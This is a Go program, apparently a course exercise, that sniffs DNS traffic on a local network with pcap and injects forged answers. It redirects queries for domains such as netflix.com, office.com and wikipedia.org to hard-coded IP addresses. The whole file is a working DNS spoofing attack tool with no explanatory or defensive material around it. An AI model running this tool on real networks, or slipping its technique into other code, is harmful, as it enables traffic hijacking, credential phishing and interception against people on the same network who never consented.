package main

import (
	"fmt"
	"log"
	"net"
	"time"
	"regexp"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	device    string = "enp0s3"
	snaplen   int32  = 65535
	promisc   bool   = true
	err       error
	timeout   time.Duration = pcap.BlockForever
	handle    *pcap.Handle
	hostnames map[string]string
)

var (
	es_index   string
	es_docType string
	es_server  string
	InetAddr   string
)

type DnsMsg struct {
	Timestamp       string
	SourceIP        string
	DestinationIP   string
	DnsQuery        string
	DnsAnswer       []string
	DnsAnswerTTL    []string
	NumberOfAnswers string
	DnsResponseCode string
	DnsOpCode       string
}

func populateHostName() {
	hostnames = make(map[string]string)
	hostnames["imdb.com"] = "192.168.100.4"
	hostnames["blackboard.com"] = "10.0.0.1"
	hostnames["spotify.org"] = "10.12.33.1"
	hostnames["whatsapp.com"] = "10.3.2.1"
	hostnames["stonybrook.edu"] = "10.3.2.2"
	hostnames["office.com"] = "10.3.2.3"
	hostnames["netflix.com"] = "10.3.2.4"
	hostnames["spotify.com"] = "10.3.2.5"
	hostnames["myshopify.com"] = "10.3.2.6"
	hostnames["wikipedia.org"] = "10.3.2.7"
}

func getSpoofedIP(s string) (string, bool) {
	for key, value := range hostnames {
		matched, _ := regexp.MatchString(key, s)
		fmt.Println(key, "-> ", value, s)
		if matched {
			return value, true
		}
	}

	return "", false
}

func getIFaceIP(ifacename string) net.IP {

	// get the list of interfaces
	ifaces, err := net.Interfaces()
	if err != nil {
		panic(err)
	}

	// loop through them to get our local address
	for i := range ifaces {

		// check it's the interface we want
		if ifaces[i].Name != ifacename {
			continue
		}

		// get the addresses
		addrs, err := ifaces[i].Addrs()
		if err != nil {
			panic(err)
		}

		// check to ensure there is an address on this interface
		if len(addrs) < 1 {
			panic("No address on target interface")
		}

		// use the first available address
		ip, _, err := net.ParseCIDR(addrs[0].String())
		if err != nil {
			panic(err)
		}

		return ip

	}
	return nil
}

func processPackets(isHostFile bool) {

	var ethLayer layers.Ethernet
	var ipv4Layer layers.IPv4
	var ipv6Layer layers.IPv6
	var tcpLayer layers.TCP
	var udpLayer layers.UDP
	var dnsLayer layers.DNS

	var payload gopacket.Payload
	var qDNS layers.DNSQuestion
	var aDNS layers.DNSResourceRecord

	outbuf := gopacket.NewSerializeBuffer()

	serialOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// pre-allocate loop counter
	var i uint16

	// swap storage for ip and udp fields
	var ipv4Addr net.IP
	var udpPort layers.UDPPort
	var ethMac net.HardwareAddr

	var isMatched bool
	var spoofedIP string

	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &ipv6Layer, &tcpLayer, &udpLayer, &dnsLayer, &payload)

	decodedLayers := make([]gopacket.LayerType, 0, 10)

	for true {

		aDNS.Type = layers.DNSTypeA
		aDNS.Class = layers.DNSClassIN
		aDNS.TTL = 300
		aDNS.IP = getIFaceIP(device)

		data, _, err := handle.ZeroCopyReadPacketData()
		if err != nil {
			fmt.Println("Error reading packet data: ", err)
			continue
		}
		// fmt.Println(ip4.SrcIP.String())
		err = parser.DecodeLayers(data, &decodedLayers)
		// only proceed if all layers decoded
		if len(decodedLayers) != 4 {
			fmt.Println("Not enough layers!")
			continue
		}

		// check that this is not a response
		if dnsLayer.QR {
			continue
		}

		for _, typ := range decodedLayers {
			switch typ {
			case layers.LayerTypeIPv4:
				// swap the ip
				ipv4Addr = ipv4Layer.SrcIP
				ipv4Layer.SrcIP = ipv4Layer.DstIP
				ipv4Layer.DstIP = ipv4Addr

			case layers.LayerTypeIPv6:
				// swap the ip
				ipv4Addr = ipv6Layer.SrcIP
				ipv6Layer.SrcIP = ipv6Layer.DstIP
				ipv6Layer.DstIP = ipv4Addr

			case layers.LayerTypeUDP:
				// swap the udp ports
				udpPort = udpLayer.SrcPort
				udpLayer.SrcPort = udpLayer.DstPort
				udpLayer.DstPort = udpPort

			case layers.LayerTypeEthernet:
				// swap ethernet macs
				ethMac = ethLayer.SrcMAC
				ethLayer.SrcMAC = ethLayer.DstMAC
				ethLayer.DstMAC = ethMac

			case layers.LayerTypeDNS:
				// set this to be a response
				dnsLayer.QR = true

				// if recursion was requested, it is available
				if dnsLayer.RD {
					dnsLayer.RA = true
				}

				// for each question
				for i = 0; i < dnsLayer.QDCount; i++ {

					// get the question
					qDNS = dnsLayer.Questions[i]

					// verify this is an A-IN record question
					if qDNS.Type != layers.DNSTypeA || qDNS.Class != layers.DNSClassIN {
						continue
					}

					// copy the name across to the response
					aDNS.Name = qDNS.Name
					// fmt.Println("NAME: ", string(qDNS.Name))

					// spoofedIP, isMatched = hostnames[string(qDNS.Name)]

					// isMatched = true
					// spoofedIP = getIFaceIP(device).String()

					// if isHostFile {
						spoofedIP, isMatched = getSpoofedIP(string(qDNS.Name))
						fmt.Println(spoofedIP)
						aDNS.IP = net.ParseIP(spoofedIP)
					// }

					if isMatched {
						fmt.Println("\nNAME: ", string(qDNS.Name))
						fmt.Println("Spoofed IP: ", spoofedIP)
					}
					// copy the name across to the response
					aDNS.Name = qDNS.Name

					// append the answer to the original query packet
					dnsLayer.Answers = append(dnsLayer.Answers, aDNS)
					dnsLayer.ANCount = dnsLayer.ANCount + 1
				}

			}
		}
		if isMatched {
			// set the UDP to be checksummed by the IP layer
			err = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
			if err != nil {
				panic(err)
			}

			// serialize packets
			err = gopacket.SerializeLayers(outbuf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
			if err != nil {
				panic(err)
			}

			// write packet
			err = handle.WritePacketData(outbuf.Bytes())
			if err != nil {
				panic(err)
			}

			fmt.Println("Response sent")

			if err != nil {
				fmt.Println("  Error encountered:", err)
			}
		}
	}
}

func main() {

	devices, err := pcap.FindAllDevs()

	device = devices[0].Name

	populateHostName()

	var filter string = "udp port 53"

	handle, err = pcap.OpenLive(device, snaplen, promisc, timeout)
	fmt.Println(filter)
	log.Printf("Listening on default \"%s\" interface\n", device)

	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	fmt.Println("Filter: ", filter)
	err = handle.SetBPFFilter(filter)

	processPackets(true)
}